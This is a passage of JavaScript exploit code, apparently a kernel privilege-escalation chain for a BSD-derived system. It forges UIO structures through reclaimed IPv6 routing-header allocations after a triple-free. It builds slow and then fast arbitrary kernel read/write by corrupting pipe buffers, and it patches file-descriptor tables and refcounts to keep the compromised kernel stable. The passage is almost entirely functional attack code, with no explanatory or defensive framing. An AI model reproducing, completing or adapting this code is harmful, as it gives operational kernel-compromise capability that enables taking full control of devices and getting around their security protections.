                    state.writev = { leadLength: null, resultLengths: [],
                        readComplete: false, complete: false };
                    this.pool.writev.dispatch([this.uioSockets[1],
                        this.buffers.uioRead.address,
                        this.off("kernel.constants.uioIovNum")], false);
                    this.yield();
                    const observation = this.getRthdr(
                        this.ipv6[this.triplets[0]], 0x10);
                    if (observation.ok && this.buffers.leak.get32(8)
                        === this.off("kernel.constants.uioIovNum")) {
                        uioCaptured = true;
                        break;
                    }
                    this.drainWritevCommand(state.writev, size);
                    diagnostics.slowRwRetries++;
                    const reseeded = this.nativeWrite(
                        this.uioSockets[1], this.buffers.tmp, size);
                    if (reseeded !== size)
                        throw new Error(`slow read reseed returned ${reseeded}/${size}`);
                }
                if (!uioCaptured) throw new Error("slow read did not capture UIO");
                const iovPointer = this.buffers.leak.get64(0);
                if (!iovPointer.isKernelPointer())
                    throw new Error("slow read leaked invalid iov");
                this.buildUio(this.buffers.msgIov, iovPointer, true, address, size);
                this.freeRthdr(this.ipv6[this.triplets[2]]);
                this.yield(3);
                this.triplets[2] = -1;

                let forged = false;
                this.setTerminalSubstage("slow-read-uio-forge");
                for (let i = 0; i < this.t.maxInnerIterations; ++i) {
                    diagnostics.slowRwRetry = i + 1;
                    state.recv = { released: false, waited: false, complete: false };
                    this.pool.recv.dispatch([this.iovSockets[0],
                        this.buffers.msg.address, 0], false);
                    this.yield(5);
                    const observation = this.getRthdr(
                        this.ipv6[this.triplets[0]], 0x40);
                    if (observation.ok
                        && this.buffers.leak.get32(0x20) === this.c.uioSysspace) {
                        forged = true;
                        break;
                    }
                    this.drainRecvCommand(state.recv);
                    diagnostics.slowRwRetries++;
                }
                if (!forged) throw new Error("slow read did not reclaim forged UIO");

                for (const output of this.buffers.leakResults)
                    output.sub(0, size, `${output.label}-reset`).fill(0x41);
                this.readWritevCommand(state.writev, size);
                const candidates = [];
                const marker = U64.fromHex("0x4141414141414141");
                for (let i = 0; i < this.buffers.leakResults.length; ++i) {
                    const output = this.buffers.leakResults[i];
                    if (state.writev.resultLengths[i] === size
                        && !output.get64(0).eq(marker)) candidates.push(output);
                }
                this.setTerminalSubstage("slow-read-triplet-repair-first");
                const repairedFirst = candidates.length === 1
                    && this.repairTriplet(1, -1);
                this.waitWritevCommand(state.writev);
                if (state.writev.leadLength !== size
                    || state.writev.resultLengths.some((value) => value !== size))
                    throw new Error("slow read drain length mismatch:"
                        + ` lead=${state.writev.leadLength}`
                        + ` workers=${state.writev.resultLengths.join(",")}`);
                if (candidates.length !== 1)
                    throw new Error(`slow read result candidates=${candidates.length}`);
                if (!repairedFirst)
                    throw new Error("slow read triplet repair 1 failed");
                this.releaseRecvCommand(state.recv);
                this.setTerminalSubstage("slow-read-triplet-repair-second");
                const repairedSecond = this.repairTriplet(2, this.triplets[1]);
                this.drainRecvCommand(state.recv);
                if (!repairedSecond)
                    throw new Error("slow read triplet repair 2 failed");
                return candidates[0].read(0, size);
            } catch (error) {
                this.unwindSlowRw(state);
                throw error;
            }
        }

        slowRead64(address) { return NS.readU64LE(this.slowRead(address, 8), 0); }

        slowWrite(address, source) {
            const data = source instanceof Uint8Array ? source : new Uint8Array(source);
            if (!data.length || data.length > 0x4000)
                throw new RangeError("invalid slow write size");
            const diagnostics = this.attemptDiagnostics;
            diagnostics.slowRwCalls++;
            diagnostics.slowRwRetry = 0;
            const input = this.buffers.rw;
            input.write(0, data);
            const state = { size: data.length, input, writev: null,
                readv: null, recv: null };
            try {
                this.setSendBuffer(data.length);
                this.buffers.uioWrite.put64(8, data.length);
                this.freeRthdr(this.ipv6[this.triplets[1]]);
                this.yield(3);
                this.triplets[1] = -1;

                let uioCaptured = false;
                this.setTerminalSubstage("slow-write-uio-capture");
                for (let i = 0; i < this.t.maxInnerIterations; ++i) {
                    diagnostics.slowRwRetry = i + 1;
                    state.readv = { writes: 0, results: [], complete: false };
                    this.pool.readv.dispatch([this.uioSockets[0],
                        this.buffers.uioWrite.address,
                        this.off("kernel.constants.uioIovNum")], false);
                    this.yield();
                    const observation = this.getRthdr(
                        this.ipv6[this.triplets[0]], 0x10);
                    if (observation.ok && this.buffers.leak.get32(8)
                        === this.off("kernel.constants.uioIovNum")) {
                        uioCaptured = true;
                        break;
                    }
                    this.feedReadvCommand(state.readv, input, data.length);
                    this.waitReadvCommand(state.readv);
                    diagnostics.slowRwRetries++;
                }
                if (!uioCaptured) throw new Error("slow write did not capture UIO");
                const iovPointer = this.buffers.leak.get64(0);
                if (!iovPointer.isKernelPointer())
                    throw new Error("slow write leaked invalid iov");
                this.buildUio(
                    this.buffers.msgIov, iovPointer, false, address, data.length);
                this.freeRthdr(this.ipv6[this.triplets[2]]);
                this.yield(3);
                this.triplets[2] = -1;

                let forged = false;
                this.setTerminalSubstage("slow-write-uio-forge");
                for (let i = 0; i < this.t.maxInnerIterations; ++i) {
                    diagnostics.slowRwRetry = i + 1;
                    state.recv = { released: false, waited: false, complete: false };
                    this.pool.recv.dispatch([this.iovSockets[0],
                        this.buffers.msg.address, 0], false);
                    this.yield(5);
                    const observation = this.getRthdr(
                        this.ipv6[this.triplets[0]], 0x40);
                    if (observation.ok
                        && this.buffers.leak.get32(0x20) === this.c.uioSysspace) {
                        forged = true;
                        break;
                    }
                    this.drainRecvCommand(state.recv);
                    diagnostics.slowRwRetries++;
                }
                if (!forged) throw new Error("slow write did not reclaim forged UIO");
                this.feedReadvCommand(state.readv, input, data.length);
                this.setTerminalSubstage("slow-write-triplet-repair-first");
                const repairedFirst = this.repairTriplet(1, -1);
                this.waitReadvCommand(state.readv);
                if (!repairedFirst)
                    throw new Error("slow write triplet repair 1 failed");
                this.releaseRecvCommand(state.recv);
                this.setTerminalSubstage("slow-write-triplet-repair-second");
                const repairedSecond = this.repairTriplet(2, this.triplets[1]);
                this.drainRecvCommand(state.recv);
                if (!repairedSecond)
                    throw new Error("slow write triplet repair 2 failed");
            } catch (error) {
                this.unwindSlowRw(state);
                throw error;
            }
        }

        slowWrite64(address, value) {
            const bytes = new Uint8Array(8);
            writeU64LE(bytes, 0, value);
            this.slowWrite(address, bytes);
        }

        promoteFastRw() {
            this.setTerminalSubstage("fast-rw-bootstrap");
            this.fdFiles = this.slowRead64(this.kqueueFdp);
            this.setTerminalSubstage("fast-rw-fd-files");
            if (!this.fdFiles.isKernelPointer())
                throw new Error(`invalid fd_files ${this.fdFiles}`);
            this.fdtOfiles = this.fdFiles.add32(
                this.off("kernel.structures.fdtOfiles"));
            const stride = this.off("kernel.structures.filedescentSize");
            const masterFile = this.slowRead64(this.fdtOfiles.add32(this.master[0] * stride));
            this.setTerminalSubstage("fast-rw-master-file");
            const victimFile = this.slowRead64(this.fdtOfiles.add32(this.victim[0] * stride));
            this.setTerminalSubstage("fast-rw-victim-file");
            const masterData = this.slowRead64(masterFile);
            this.setTerminalSubstage("fast-rw-master-pipe");
            const victimData = this.slowRead64(victimFile);
            this.setTerminalSubstage("fast-rw-victim-pipe");
            for (const [name, pointer] of [["master file", masterFile],
                ["victim file", victimFile], ["master pipe", masterData],
                ["victim pipe", victimData]]) {
                if (!pointer.isKernelPointer())
                    throw new Error(`invalid ${name}: ${pointer}`);
            }
            const pipe = new Uint8Array(0x18);
            writeU32LE(pipe, 0x00, 0);
            writeU32LE(pipe, 0x04, 0);
            writeU32LE(pipe, 0x08, 0);
            writeU32LE(pipe, 0x0c, this.off("kernel.constants.pageSize"));
            writeU64LE(pipe, 0x10, victimData);
            this.slowWrite(masterData, pipe);
            const verify = this.slowRead64(masterData.add32(0x10));
            this.setTerminalSubstage("fast-rw-verify-slow");
            if (!verify.eq(victimData))
                throw new Error("master pipe corruption verification failed");
            this.fast = true;
            const probeAddress = masterData.add32(0x10);
            let fastReadVerify, fastWriteVerify;
            this.setTerminalSubstage("fast-rw-verify-native");
            try {
                fastReadVerify = this.read64(probeAddress);
                if (!fastReadVerify.eq(victimData))
                    throw new Error(`fast kernel read probe mismatch: ${fastReadVerify.toHex()}`);

                this.write64(probeAddress, victimData);
                fastWriteVerify = this.read64(probeAddress);
                if (!fastWriteVerify.eq(victimData))
                    throw new Error(`fast kernel write probe mismatch: ${fastWriteVerify.toHex()}`);
            } catch (error) {
                this.fast = false;
                this.fastValidated = false;
                if (/^fast kernel (read|write) probe mismatch:/.test(error.message))
                    throw error;
                throw new Error(`fast kernel probe failed: ${error.message}`);
            }
            this.fastValidated = true;
            this.transition(STAGE.FAST_RW);
        }

        corruptVictim(count, address) {
            const command = this.buffers.pipeCommand;
            command.put32(0x00, count);
            command.put32(0x04, 0);
            command.put32(0x08, 0);
            command.put32(0x0c, this.off("kernel.constants.pageSize"));
            command.put64(0x10, address);
            if (this.nativeWrite(this.master[1], command, 0x18) !== 0x18)
                throw new Error("master pipe command write failed");
            if (this.nativeRead(this.master[0], command, 0x18) !== 0x18)
                throw new Error("master pipe command drain failed");
        }

        read(address, size) {
            if (!this.fast) throw new Error("fast kernel read is unavailable");
            if (size <= 0 || size > 0x4000) throw new RangeError("invalid kernel read size");
            this.corruptVictim(size, address);
            const result = this.nativeRead(this.victim[0], this.buffers.rw, size);
            if (result !== size) throw new Error(`kernel read returned ${result}/${size}`);
            return this.buffers.rw.read(0, size);
        }

        write(address, source) {
            if (!this.fast) throw new Error("fast kernel write is unavailable");
            const bytes = source instanceof Uint8Array ? source : new Uint8Array(source);
            if (!bytes.length || bytes.length > 0x4000)
                throw new RangeError("invalid kernel write size");
            this.buffers.rw.write(0, bytes);
            this.corruptVictim(0, address);
            const result = this.nativeWrite(this.victim[1], this.buffers.rw, bytes.length);
            if (result !== bytes.length)
                throw new Error(`kernel write returned ${result}/${bytes.length}`);
        }

        read8(address) { return this.read(address, 1)[0]; }
        read32(address) { return NS.readU32LE(this.read(address, 4), 0); }
        read64(address) { return NS.readU64LE(this.read(address, 8), 0); }
        write8(address, value) { this.write(address, new Uint8Array([value & 0xff])); }
        write32(address, value) {
            const bytes = new Uint8Array(4); writeU32LE(bytes, 0, value);
            this.write(address, bytes);
        }
        write64(address, value) {
            const bytes = new Uint8Array(8); writeU64LE(bytes, 0, value);
            this.write(address, bytes);
        }

        fget(fd) {
            return this.read64(this.fdtOfiles.add32(
                fd * this.off("kernel.structures.filedescentSize")));
        }

        fileDataOffset() { return this.off("kernel.structures.fileData"); }
        fileRefcountOffset() {
            return this.off("kernel.structures.fileRefcount");
        }
        socketPcbOffset() { return this.off("kernel.structures.socketPcb"); }

        holdFile(fd) {
            const prior = this.fileHoldRecords.find((record) => record.fd === fd);
            if (prior) {
                if (prior.verified) return prior;
                throw new Error(`fd ${fd} prior refcount hold is unverified; refusing rewrite`);
            }
            const file = this.fget(fd);
            if (!file.isKernelPointer()) throw new Error(`fd ${fd} has invalid file pointer`);
            const refSlot = file.add32(this.fileRefcountOffset());
            const refs = this.read32(refSlot);
            if (refs === 0 || refs >= 0x10000) throw new Error(`fd ${fd} bad refcount ${refs}`);
            const held = refs + 0x100;
            const record = { fd, verified: false };

            // Journal first so cleanup never repeats a file hold.
            this.fileHoldRecords.push(record);
            this.write32(refSlot, held);
            const observed = this.read32(refSlot);
            const observationDelta = observed - held;
            const effectiveIncrease = observed - refs;

            // Permit one transient observer reference and 0xff durable holds.
            if (observationDelta < -1 || observationDelta > 1
                || effectiveIncrease < 0xff || effectiveIncrease > 0x101) {
                throw new Error(`fd ${fd} refcount hold verification ${observed}/${held}`
                    + ` (delta=${observationDelta})`);
            }
            record.verified = true;
            return record;
        }

        removeRthdr(fd) {
            const file = this.fget(fd);
            if (!file.isKernelPointer()) return { reachable: false, hadRthdr: false };
            const socket = this.read64(file.add32(this.fileDataOffset()));
            if (!socket.isKernelPointer()) return { reachable: false, hadRthdr: false };
            const pcb = this.read64(socket.add32(this.socketPcbOffset()));
            if (!pcb.isKernelPointer()) return { reachable: false, hadRthdr: false };
            const options = this.read64(pcb.add32(
                this.off("kernel.structures.in6pOutputopts")));
            if (!options.isKernelPointer()) return { reachable: false, hadRthdr: false };
            const slot = options.add32(this.off("kernel.structures.ip6poRthdr"));
            const before = this.read64(slot);
            if (!before.isZero() && !before.isKernelPointer())
                throw new Error(`fd ${fd} has invalid routing header ${before.toHex()}`);
            if (!before.isZero()) this.write64(slot, 0);
            const after = this.read64(slot);
            if (!after.isZero())
                throw new Error(`fd ${fd} routing header cleanup did not persist`);
            return { reachable: true, hadRthdr: !before.isZero() };
        }

        phantomScanClean() {
            const scan = this.cleanup.phantomScan;
            const closed = new Set(scan.closedFds);
            return !scan.exhausted && scan.residentFds.length === 0
                && scan.heldFds.every((fd) => closed.has(fd));
        }

        closePhantomDrainFds() {
            const scan = this.cleanup.phantomScan;
            const closed = new Set(scan.closedFds);
            for (const fd of scan.heldFds) {
                if (closed.has(fd)) continue;
                const result = this.callI32("native.exports.close", [fd]);
                if (result !== 0)
                    throw new Error(`phantom drain close ${fd}: ${result}`);
                scan.closedFds.push(fd);
                closed.add(fd);
            }
        }

        detachUafAliases() {
            this.attemptDiagnostics.cleanupPhase = "uaf-aliases";
            if (this.uafSocket < 0) throw new Error("UAF socket is unavailable");
            const targetPurged = this.t.cleanupUafPurged;
            const stride = this.off("kernel.structures.filedescentSize");
            if (this.uafFile.isZero()) this.uafFile = this.fget(this.uafSocket);
            const uafFile = this.uafFile;
            if (!uafFile.isKernelPointer())
                throw new Error(`invalid UAF file ${uafFile.toHex()}`);

            const originalSlot = this.fdtOfiles.add32(this.uafSocket * stride);
            const originalFile = this.read64(originalSlot);
            const scan = this.cleanup.phantomScan;
            this.attemptDiagnostics.phantomLinearAttempts
                = scan.linearAttempts;
            this.attemptDiagnostics.phantomDrainAttempts
                = scan.drainAttempts;
            this.attemptDiagnostics.phantomHeldPeak = scan.heldPeak;
            if (!originalFile.isZero() && !originalFile.eq(uafFile))
                throw new Error(`UAF descriptor ${this.uafSocket} changed file identity`);
            if (!originalFile.isZero()) this.write64(originalSlot, 0);
            if (!this.read64(originalSlot).isZero())
                throw new Error("UAF descriptor slot is still attached");
            if (!this.cleanup.detachedFds.includes(this.uafSocket))
                this.cleanup.detachedFds.push(this.uafSocket);
            this.cleanup.uafDetached = this.t.cleanupUafDetached;

            if (scan.targetFile === null) {
                scan.targetFile = uafFile.toHex();
                for (let fd = 0; fd < this.uafSocket; ++fd) {
                    if (this.fget(fd).eq(uafFile)) scan.residentFds.push(fd);
                }
            }
            if (scan.residentFds.length) {
                scan.exhausted = true;
                throw new Error(`UAF file has resident descriptor aliases: `
                    + scan.residentFds.join(","));
            }

            this.closePhantomDrainFds();
            let purged = new Set(this.cleanup.uafPurgedFds).size;
            if (purged > targetPurged)
                throw new Error(`UAF purge journal overflow ${purged}/${targetPurged}`);
            this.cleanup.uafPurged = purged;
            if (scan.exhausted && purged < targetPurged)
                throw new Error(`UAF phantom purge scan already exhausted ${purged}`
                    + `/${targetPurged}`);
            const drainAfter = Number.isSafeInteger(this.t.phantomDrainAfter)
                ? Math.min(this.t.phantomDrainAfter, this.t.phantomSocketLimit)
                : this.t.phantomSocketLimit;
            const drainBatch = Number.isSafeInteger(this.t.phantomDrainBatch)
                ? this.t.phantomDrainBatch : 0;
            const drainEnd = Math.min(this.t.phantomSocketLimit,
                drainAfter + drainBatch);
            let socketFailure = null;
            while (scan.linearAttempts + scan.drainAttempts < this.t.phantomSocketLimit
                && purged < targetPurged) {
                const total = scan.linearAttempts + scan.drainAttempts;
                const draining = total >= drainAfter && total < drainEnd;
                if (draining) scan.drainTriggered = true;
                else if (total === drainEnd) this.closePhantomDrainFds();
                const fd = this.callI32("native.exports.socket",
                    [this.c.afUnix, this.c.sockStream, 0]);
                if (draining) scan.drainAttempts++;
                else scan.linearAttempts++;
                this.attemptDiagnostics.phantomLinearAttempts
                    = scan.linearAttempts;
                this.attemptDiagnostics.phantomDrainAttempts
                    = scan.drainAttempts;
                if (fd < 0) {
                    socketFailure = fd;
                    break;
                }
                const slot = this.fdtOfiles.add32(fd * stride);
                if (this.read64(slot).eq(uafFile)) {
                    this.write64(slot, 0);
                    if (!this.read64(slot).isZero())
                        throw new Error(`phantom UAF descriptor ${fd} is still attached`);
                    if (!this.cleanup.uafPurgedFds.includes(fd))
                        this.cleanup.uafPurgedFds.push(fd);
                    purged = new Set(this.cleanup.uafPurgedFds).size;
                    this.cleanup.uafPurged = purged;
                    continue;
                }
                if (draining) {
                    scan.heldFds.push(fd);
                    scan.heldPeak = Math.max(scan.heldPeak,
                        scan.heldFds.length - scan.closedFds.length);
                    this.attemptDiagnostics.phantomHeldPeak = scan.heldPeak;
                    continue;
                }
                const closed = this.callI32("native.exports.close", [fd]);
                if (closed !== 0)
                    throw new Error(`phantom scan close ${fd}: ${closed}`);
            }
            if (purged !== targetPurged) scan.exhausted = true;
            this.closePhantomDrainFds();
            this.cleanup.uafPurged = purged;
            this.attemptDiagnostics.phantomHeldPeak = scan.heldPeak;
            const attempts = scan.linearAttempts + scan.drainAttempts;
            if (purged !== targetPurged) {
                const detail = socketFailure === null
                    ? (scan.drainTriggered
                        ? `churn/drain scan ${scan.linearAttempts}`
                            + `+${scan.drainAttempts} exhausted`
                        : `attempt ceiling ${this.t.phantomSocketLimit}`)
                    : `socket result ${socketFailure}`;
                throw new Error(`UAF phantom purge incomplete ${purged}/${targetPurged}`
                    + ` after ${attempts} attempts (${detail})`);
            }
        }

        validateCleanupSummary(summary) {
            const failures = [];
            if (summary.workers !== 0) failures.push(`workers=${summary.workers}`);
            if (summary.heldPipes !== this.t.cleanupPipeHolds)
                failures.push(`heldPipes=${summary.heldPipes}`
                    + `/${this.t.cleanupPipeHolds}`);
            if (summary.verifiedPipeHolds !== this.t.cleanupPipeHolds)
                failures.push(`verifiedPipeHolds=${summary.verifiedPipeHolds}`
                    + `/${this.t.cleanupPipeHolds}`);
            if (summary.tripletRthdr !== this.t.cleanupTripletHeaders)
                failures.push(`tripletRthdr=${summary.tripletRthdr}`
                    + `/${this.t.cleanupTripletHeaders}`);
            if (this.triggerFamily === "netcontrol") {
                if (summary.uafDetached !== this.t.cleanupUafDetached)
                    failures.push(`uafDetached=${summary.uafDetached}`
                        + `/${this.t.cleanupUafDetached}`);
                if (summary.detachedDescriptors !== this.t.cleanupUafDetached)
                    failures.push(`detachedDescriptors=${summary.detachedDescriptors}`
                        + `/${this.t.cleanupUafDetached}`);
                if (!summary.uafDescriptorDetached)
                    failures.push("uafDescriptorDetached=false");
                if (summary.uafPurged !== this.t.cleanupUafPurged)
                    failures.push(`uafPurged=${summary.uafPurged}`
                        + `/${this.t.cleanupUafPurged}`);
                if (summary.purgedUafDescriptors !== this.t.cleanupUafPurged)
                    failures.push(`purgedUafDescriptors=${summary.purgedUafDescriptors}`
                        + `/${this.t.cleanupUafPurged}`);
                if (!summary.phantomScanClean)
                    failures.push("phantom scan is not clean");
                if (!summary.uafDescriptorDisjoint)
                    failures.push("uafDescriptorDisjoint=false");
            }
            if (summary.disposableDescriptors !== summary.requiredClosedDescriptors)
                failures.push(`disposableDescriptors=${summary.disposableDescriptors}`
                    + `/${summary.requiredClosedDescriptors}`);
            if (summary.expectedClosedDescriptors !== summary.requiredClosedDescriptors)
                failures.push(`descriptorSet=${summary.expectedClosedDescriptors}`
                    + `/${summary.requiredClosedDescriptors}`);
            if (summary.closedDescriptors !== summary.expectedClosedDescriptors)
                failures.push(`closedDescriptors=${summary.closedDescriptors}`
                    + `/${summary.expectedClosedDescriptors}`);
            if (!summary.schedulingRestored)
                failures.push("schedulingRestored=false");
            if (failures.length)
                throw new Error(`deep cleanup invariant failure: ${failures.join(", ")}`);
            return summary;
        }

        cleanupOverflowPoolFds() {
            const stride = this.off("kernel.structures.filedescentSize");
            let detached = 0;
            for (let i = this.freeFdIdx; i < this.freeFds.length; ++i) {
                const fd = this.freeFds[i];
                const slot = this.fdtOfiles.add32(fd * stride);
                const file = this.read64(slot);
                if (!file.isZero()) {
                    this.write64(slot, 0);
                    if (!this.cleanup.detachedFds.includes(fd))
                        this.cleanup.detachedFds.push(fd);
                    detached++;
                }
            }
            this.cleanup.uafDetached = Math.max(
                this.t.cleanupUafDetached, detached);
            this.cleanup.uafPurged = this.t.cleanupUafPurged;
        }

        deepCleanup() {
            this.attemptDiagnostics.cleanupPhase = "gate";
            if (!this.fast || !this.fastValidated)
                throw new Error("deep cleanup requires validated fast kernel R/W");
            if (this.stage === STAGE.STABLE) return this.cleanup;
            if (this.stage !== STAGE.FAST_RW)
                throw new Error(`deep cleanup is unavailable at stage ${this.stage}`);

            this.cleanup.attempts++;

            this.attemptDiagnostics.cleanupPhase = "workers";
            if (!this.cleanup.workersStopped) {
                if (this.pool?.started) this.pool.stop();
                const live = this.pool ? this.pool.liveWorkerCount() : 0;
                if (live !== 0) throw new Error(`deep cleanup left ${live} live workers`);
                this.cleanup.workersStopped = true;
            }

            this.attemptDiagnostics.cleanupPhase = "routing-headers";
            const tripletFds = this.triplets.map((index) =>
                Number.isInteger(index) && index >= 0 && index < this.ipv6.length
                    ? this.ipv6[index] : -1);
            if (new Set(tripletFds).size !== this.t.cleanupTripletHeaders
                || tripletFds.includes(-1))
                throw new Error(`invalid cleanup triplets ${this.triplets.join(",")}`);
            for (const fd of this.ipv6) {
                if (this.cleanup.rthdrFds.includes(fd)) continue;
                const result = this.removeRthdr(fd);
                if (!result.reachable) {
                    if (tripletFds.includes(fd))
                        throw new Error(`triplet fd ${fd} routing header is unreachable`);
                    continue;
                }
                this.cleanup.rthdrFds.push(fd);
                if (tripletFds.includes(fd))
                    this.cleanup.tripletRthdrFds.push(fd);
            }

            this.attemptDiagnostics.cleanupPhase = "pipe-holds";
            for (const fd of [...this.master, ...this.victim]) {
                if (this.cleanup.heldPipeFds.includes(fd)) continue;
                const record = this.holdFile(fd);
                if (!record.verified)
                    throw new Error(`fd ${fd} refcount hold remains unverified`);
                this.cleanup.heldPipeFds.push(fd);
            }

            this.attemptDiagnostics.cleanupPhase = "uaf-aliases";
            if (this.triggerFamily === "netcontrol") {
                if (this.cleanup.uafDetached < this.t.cleanupUafDetached
                    || this.cleanup.uafPurged < this.t.cleanupUafPurged)
                    this.detachUafAliases();
                const purgedUafDescriptors = new Set(
                    this.cleanup.uafPurgedFds).size;
                if (this.cleanup.uafDetached !== this.t.cleanupUafDetached
                    || !this.cleanup.detachedFds.includes(this.uafSocket)
                    || this.cleanup.uafPurged !== this.t.cleanupUafPurged
                    || purgedUafDescriptors !== this.t.cleanupUafPurged) {
                    throw new Error("UAF cleanup gate failed before descriptor closure:"
                        + ` detached=${this.cleanup.uafDetached}`
                        + `/${this.t.cleanupUafDetached}`
                        + ` descriptor=${this.cleanup.detachedFds.includes(this.uafSocket)}`
                        + ` purged=${this.cleanup.uafPurged}`
                        + `/${this.t.cleanupUafPurged}`
                        + ` journal=${purgedUafDescriptors}`
                        + `/${this.t.cleanupUafPurged}`);
                }
            } else {
                this.cleanupOverflowPoolFds();
            }

            this.attemptDiagnostics.cleanupPhase = "descriptors";
            const disposableFds = [...this.ipv6, ...this.iovSockets,
                ...this.uioSockets];
            const disposableFdSet = new Set(disposableFds);
            const requiredDisposableDescriptors = this.t.ipv6Sockets
                + this.t.cleanupWorkerDescriptors;
            if (disposableFdSet.size !== requiredDisposableDescriptors)
                throw new Error(`disposable descriptor geometry ${disposableFdSet.size}`
                    + `/${requiredDisposableDescriptors}`);
            if (this.triggerFamily === "netcontrol" && disposableFdSet.has(this.uafSocket))
                throw new Error(`UAF descriptor ${this.uafSocket}`
                    + " unexpectedly overlaps the disposable descriptor set");
            const detached = new Set(this.cleanup.detachedFds);
            const closeFds = disposableFds.filter((fd) => !detached.has(fd));
            for (const fd of closeFds) {
                if (this.cleanup.closedFds.includes(fd)) continue;
                const result = this.callI32("native.exports.close", [fd]);
                if (result !== 0) throw new Error(`deep cleanup close ${fd}: ${result}`);
                this.cleanup.closedFds.push(fd);
            }

            this.attemptDiagnostics.cleanupPhase = "scheduling";
            if (!this.cleanup.schedulingRestored) {
                const warnings = this.restoreMainThread();
                if (warnings.length)
                    throw new Error(`deep cleanup scheduling: ${warnings.join("; ")}`);
                this.cleanup.schedulingRestored = !this.mainAffinityApplied
                    && !this.mainPriorityApplied;
            }

            const critical = new Set([...this.master, ...this.victim]);
            const verifiedPipeHolds = this.fileHoldRecords.filter((record) =>
                critical.has(record.fd) && record.verified).length;

            const purgedUafDescriptors = this.triggerFamily === "netcontrol"
                ? new Set(this.cleanup.uafPurgedFds).size
                : this.t.cleanupUafPurged;
            this.attemptDiagnostics.cleanupPhase = "verify";
            const summary = this.validateCleanupSummary({
                workers: this.pool ? this.pool.liveWorkerCount() : 0,
                heldPipes: new Set(this.cleanup.heldPipeFds).size,
                verifiedPipeHolds,
                tripletRthdr: new Set(this.cleanup.tripletRthdrFds).size,
                uafDetached: this.cleanup.uafDetached,
                uafPurged: this.cleanup.uafPurged,
                purgedUafDescriptors,
                phantomScanClean: this.triggerFamily === "netcontrol"
                    ? this.phantomScanClean() : true,
                detachedDescriptors: new Set(this.cleanup.detachedFds).size,
                uafDescriptorDetached: this.triggerFamily === "netcontrol"
                    ? this.cleanup.detachedFds.includes(this.uafSocket) : true,
                uafDescriptorDisjoint: this.triggerFamily === "netcontrol"
                    ? !disposableFdSet.has(this.uafSocket) : true,
                disposableDescriptors: disposableFdSet.size,
                closedDescriptors: new Set(this.cleanup.closedFds).size,
                expectedClosedDescriptors: new Set(closeFds).size,
                requiredClosedDescriptors: requiredDisposableDescriptors,
                schedulingRestored: this.cleanup.schedulingRestored
            });
            this.attemptDiagnostics.cleanup = {
                workers: summary.workers,
                uafDetached: summary.uafDetached,
                uafPurged: summary.uafPurged,
                phantomScanClean: summary.phantomScanClean,
                closedDescriptors: summary.closedDescriptors,
                schedulingRestored: summary.schedulingRestored
            };
            this.attemptDiagnostics.cleanupPhase = "complete";
            this.transition(STAGE.STABLE);
            this.rebootRequired = false;
            return summary;
        }

        safeCleanup() {
            const warnings = [];
            this.attemptDiagnostics.cleanupPhase = "safe-workers";
            if (this.burnWorkers) {
                try { this.burnWorkers.stop(); }
                catch (error) { warnings.push(error.message); }
            }
            try { if (this.pool?.started) this.pool.stop(); }
            catch (error) { warnings.push(error.message); }
            const liveWorkers = this.pool ? this.pool.liveWorkerCount() : 0;
            if (liveWorkers !== 0) {
                this.rebootRequired = true;
                warnings.push(`${liveWorkers} workers remain live`);
            } else {
                this.attemptDiagnostics.cleanupPhase = "safe-descriptors";
                const descriptors = new Set([...this.ipv6, ...this.iovSockets,
                    ...this.uioSockets, ...this.master, ...this.victim]);
                for (const fd of descriptors) {
                    if (fd < 0) continue;
                    try {
                        const result = this.callI32("native.exports.close", [fd]);
                        if (result !== 0) warnings.push(`close ${fd}: ${result}`);
                    }
                    catch (error) { warnings.push(error.message); }
                }
            }
            this.attemptDiagnostics.cleanupPhase = "safe-scheduling";
            warnings.push(...this.restoreMainThread());
            if (warnings.length === 0)
                this.attemptDiagnostics.cleanupPhase = "safe-complete";
            return warnings;
        }

        emergencyCleanup() {
            const warnings = [];
            this.attemptDiagnostics.cleanupPhase = "emergency-start";
            if (this.fast) {
                if (this.cleanup.attempts === 0) {
                    try { this.deepCleanup(); }
                    catch (error) { warnings.push(error.message); }
                } else {
                    warnings.push("deep cleanup retry blocked");
                }
                this.attemptDiagnostics.cleanupPhase = "emergency-scheduling";
                warnings.push(...this.restoreMainThread());
                if (warnings.length === 0)
                    this.attemptDiagnostics.cleanupPhase = "emergency-complete";
                return warnings;
            }
            if (this.burnWorkers) {
                try { this.burnWorkers.stop(); }
                catch (error) { warnings.push(error.message); }
            }
            const workerInFlight = [this.pool?.recv, this.pool?.writev,
                this.pool?.readv].some((group) => group?.inFlight);
            if (this.triggerFamily === "netcontrol"
                && !this.fdtOfiles.isZero() && this.uafSocket >= 0) {
                if (workerInFlight) {
                    warnings.push("UAF descriptor detach skipped while a worker syscall is in flight");
                } else {
                    try {
                        const slot = this.fdtOfiles.add32(this.uafSocket
                            * this.off("kernel.structures.filedescentSize"));
                        this.slowWrite64(slot, 0);
                    } catch (error) { warnings.push(error.message); }
                }
            }
            try { if (this.pool?.started) this.pool.stop(); }
            catch (error) { warnings.push(error.message); }
            this.attemptDiagnostics.cleanupPhase = "emergency-scheduling";
            warnings.push(...this.restoreMainThread());
            if (warnings.length === 0)
                this.attemptDiagnostics.cleanupPhase = "emergency-complete";
            return warnings;
        }

        run() {
            try {
                this.setTerminalSubstage("prepare");
                this.progressBoundary("POOPS-PREPARE");
                this.prepare();
                this.progressBoundary("POOPS-PREPARED");
                this.setTerminalSubstage("triple-free");
                this.triggerTripleFree();
                this.setTerminalSubstage("kqueue-reclaim");
                this.reclaimKqueue();
                this.transition(STAGE.SLOW_RW);
                this.setTerminalSubstage("fast-rw-promotion");
                this.promoteFastRw();
                this.setTerminalSubstage("deep-cleanup");
                this.deepCleanup();
                this.setTerminalSubstage("complete");
                this.progressBoundary("POOPS-CLEANUP-COMPLETE");
                return this;
            } catch (cause) {
                this.attemptDiagnostics.failureStage = this.stage;
                this.attemptDiagnostics.failureCleanupPhase
                    = typeof this.attemptDiagnostics.cleanupPhase === "string"
                        ? this.attemptDiagnostics.cleanupPhase : null;
                const cleanupWarnings = [];
                let safeCleanupCompleted = false;
                try {
                    const warnings = this.dirty
                        ? this.emergencyCleanup() : this.safeCleanup();
                    if (Array.isArray(warnings))
                        cleanupWarnings.push(...warnings.map(String));
                    safeCleanupCompleted = !this.dirty
                        && Array.isArray(warnings);
                } catch (error) {
                    if (Array.isArray(error?.cleanupWarnings))
                        cleanupWarnings.push(...error.cleanupWarnings.map(String));
                    else
                        cleanupWarnings.push(error?.message || String(error));
                    this.rebootRequired = true;
                }
                this.preDirtyCleanupVerified = safeCleanupCompleted
                    && cleanupWarnings.length === 0;
